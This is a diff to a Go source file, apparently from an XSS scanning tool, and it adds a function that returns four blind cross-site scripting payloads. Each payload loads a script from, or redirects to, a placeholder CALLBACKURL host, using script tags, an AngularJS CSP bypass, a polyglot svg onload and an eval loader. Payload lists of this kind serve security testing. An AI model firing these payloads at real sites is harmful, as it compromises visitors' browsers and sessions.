@@ -17,6 +17,17 @@ func getSSTIPayload() []string {
 	return payload
 }
 
+// getBlindPayload is return Blind XSS Payload
+func getBlindPayload() []string {
+	payload := []string{
+		"\"'><script src=//CALLBACKURL></script>",
+		"\"'><script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js></script><div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//CALLBACKURL'\"></textarea></div>",
+		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+document.location=`//CALLBACKURL`//'>",
+		"\"'><svg onload=\"javascript:eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'//CALLBACKURL\\';d.body.appendChild(_)')\" xmlns=\"http://www.w3.org/2000/svg\"></svg>",
+	}
+	return payload
+}
+
 // getCommonPayload is return xss
 func getCommonPayload() []string {
 	payload := []string{
